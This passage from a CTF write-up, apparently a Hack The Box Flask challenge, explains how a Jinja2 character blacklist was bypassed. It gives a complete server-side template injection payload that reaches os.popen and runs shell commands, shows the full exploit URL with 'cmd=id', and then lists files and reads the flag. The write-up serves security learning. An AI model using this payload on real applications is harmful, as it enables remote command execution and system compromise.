Blacklist</h1>\n<p>To bypass this filter, I searched for alternative approaches and found a method in this  <a href=\"https://0day.work/jinja2-template-injection-filter-bypasses/\">article</a></p>\n<p>The idea was to use another input parameter to read the payload, this approach involved crafting a payload that would bypass the filter</p>\n<div class=\"remark-highlight\"><pre class=\"language-unknown\"><code class=\"language-unknown\">\n+---------------------------+  \n|       Main Input          |  \n|  (Filtered by blacklist)  |  \n+---------------------------+  \n            |  \n            v  \n+---------------------------+  \n|       Alternative         |  \n|        Input Parameter     |  \n|    (Not filtered)         |  \n+---------------------------+  \n            |  \n            v  \n+---------------------------+  \n|   Payload Injection       |  \n|   (Bypassing the filter)  |  \n+---------------------------+  \n            |  \n            v  \n+---------------------------+  \n|       Final Output        |  \n|  (Executed Command Result)|  \n+---------------------------+</code></pre></div>\n<p>And that’s the payload I came with</p>\n<div class=\"remark-highlight\"><pre class=\"language-html\"><code class=\"language-html\"><span title=\"{\" class=\"token entity\">&#x26;#123;</span>%with output=((((request|attr('application'))|attr(request|attr(<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>args<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>)|attr(<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>get<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>)(<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>globals<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>)))|attr(request|attr(<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>args<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>)|attr(<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>get<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>)(<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>getitem<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>)))(request|attr(<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>args<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>)|attr(<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>get<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>)(<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>builtins<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>))|attr(request|attr(<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>args<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>)|attr(<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>get<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>)(<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>getitem<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>)))(request|attr(<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>args<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>)|attr(<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>get<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>)(<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>import<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>)))(<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>os<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>)|attr(<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>popen<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>)(request|attr(<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>args<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>)|attr(<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>get<span title=\"&#x22;\" class=\"token entity named-entity\">&#x26;quot;</span>)(<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>cmd<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>))|attr(<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>read<span title=\"&#x27;\" class=\"token entity\">&#x26;#39;</span>)()%<span title=\"}\" class=\"token entity\">&#x26;#125;</span><span title=\"{\" class=\"token entity\">&#x26;#123;</span>%print(output)%<span title=\"}\" class=\"token entity\">&#x26;#125;</span><span title=\"{\" class=\"token entity\">&#x26;#123;</span>%endwith%<span title=\"}\" class=\"token entity\">&#x26;#125;</span>&#x26;globals=__globals__&#x26;getitem=__getitem__&#x26;builtins=__builtins__&#x26;import=__import__&#x26;cmd=\n\n</code></pre></div>\n<p>To bypass the filter, I crafted a payload that cleverly navigates around the blacklisted characters</p>\n<p><code>invalid_chars = [\"{{\", \"}}\", \".\", \"_\", \"[\", \"]\",\"\\\\\", \"x\"]</code></p>\n<p>I replaced blacklisted characters and patterns with alternatives:</p>\n<ul>\n<li><code>**{{**</code>  was replaced with  <code>**{%**</code>.</li>\n<li><code>**}}**</code>  was replaced with  <code>**%}**</code>.</li>\n<li><code>**.**</code>  was bypassed by using attribute chaining through the  <code>request</code>  object.</li>\n<li><code>**_**</code>  was avoided by using alternative attribute names and methods.</li>\n<li><code>**[**</code> <strong>and</strong> <code>**]**</code>  were substituted with attribute access via  <code>attr()</code>.</li>\n<li><code>**\\\\**</code>  and  <code>**x**</code>  were sidestepped by constructing the payload in a way that didn't require these characters.</li>\n</ul>\n<p>I navigated through the  <code>request</code>  attributes to access Python’s  <code>globals</code>  and  <code>builtins</code>  dictionaries, using the  <code>import</code>  function, I imported the  <code>os</code>  module and used its  <code>popen</code>  method to OS execute commands</p>\n<p>— — — — — — — — — — — — — — — — -</p>\n<p>And Successfully executed the  <code>id</code>  command, confirming root access</p>\n<div class=\"remark-highlight\"><pre class=\"language-http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//0.0.0.0:3000/home?token=&#x3C;>&#x26;directory=&#x26;#123;%with output=((((request|attr('application'))|attr(request|attr(\"args\")|attr(\"get\")('globals')))|attr(request|attr(\"args\")|attr(\"get\")('getitem')))(request|attr(\"args\")|attr(\"get\")('builtins'))|attr(request|attr(\"args\")|attr(\"get\")('getitem')))(request|attr(\"args\")|attr(\"get\")('import'))('os')|attr('popen')(request|attr(\"args\")|attr(\"get\")('cmd'))|attr('read')()%&#x26;#125;&#x26;#123;%print(output)%&#x26;#125;&#x26;#123;%endwith%&#x26;#125;&#x26;globals=__globals__&#x26;getitem=__getitem__&#x26;builtins=__builtins__&#x26;import=__import__&#x26;cmd=id</span></span>\n\n</code></pre></div>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:700/1*Xl5B59r9fgJGMBkPuPNcLg.png\" alt=\"\"></p>\n<p>Nice, Root:)</p>\n<p>Ran  <code>ls -lah /</code>  to list the system files, which revealed the flag's location</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:695/1*0Kw-zjh-CPKYvW8O7ym5kQ.png\" alt=\"\"></p>\n<p>nice flag is there, lets use  <code>cat</code>to read the flag from the file, successfully retrieving it</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:700/1*TCdBFtrQgv36-ftOkivS8g.png\" alt=\"\"></p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:700/1*A3zR-rBM2mstqTg5zxvU8w.png\" alt=\"\"></p>\n<p>And That’s it</p>\n<p>Bye UwU</p>\n",
    "tags": [
      "HTB",
      "CTF",
      "Flask",
      "NextJS",
      "Web Security"
    ],
    "author": "MindPatch"
  }
]
